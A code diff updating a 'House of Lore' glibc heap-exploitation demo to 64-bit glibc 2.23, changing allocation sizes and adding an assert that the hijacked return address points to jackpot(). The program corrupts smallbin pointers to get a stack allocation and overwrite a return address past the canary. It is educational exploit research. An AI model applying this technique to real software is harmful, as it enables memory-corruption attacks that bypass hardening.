@@ -25,6 +25,7 @@ else
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
+#include <assert.h>
 
 void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }
 
@@ -36,10 +37,10 @@ int main(int argc, char * argv[]){
 
   fprintf(stderr, "\nWelcome to the House of Lore\n");
   fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
-  fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");
+  fprintf(stderr, "This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n");
 
   fprintf(stderr, "Allocating the victim chunk\n");
-  intptr_t *victim = malloc(100);
+  intptr_t *victim = malloc(0x100);
   fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);
 
   // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
@@ -95,12 +96,12 @@ int main(int argc, char * argv[]){
   fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
   fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");
 
-  void *p3 = malloc(100);
+  void *p3 = malloc(0x100);
 
 
   fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
-  char *p4 = malloc(100);
-  fprintf(stderr, "p4 = malloc(100)\n");
+  char *p4 = malloc(0x100);
+  fprintf(stderr, "p4 = malloc(0x100)\n");
 
   fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
          stack_buffer_2[2]);
@@ -108,4 +109,7 @@ int main(int argc, char * argv[]){
   fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
   memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
+
+  // sanity check
+  assert((long)__builtin_return_address(0) == (long)jackpot);
 }
